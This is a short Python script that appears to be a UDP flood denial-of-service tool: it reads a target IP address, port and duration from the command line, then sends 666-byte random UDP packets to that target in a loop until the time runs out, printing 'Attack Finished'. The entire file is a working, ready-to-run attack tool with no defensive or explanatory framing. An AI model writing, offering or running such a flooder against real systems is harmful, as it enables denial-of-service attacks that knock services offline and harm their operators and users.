import os, sys
import time
from time import time as tt
import socket
import random

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])

def attack(ip, port, time):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    startup = tt()
    data = random._urandom(666)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    while True:
        endtime = tt()
        if (startup + time) < endtime:
            break
        s.sendto(data,addr)
    print('\033[92mAttack Finished')

if __name__ == '__main__':
    try:
        attack(ip, port, time)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")
        os.system("clear")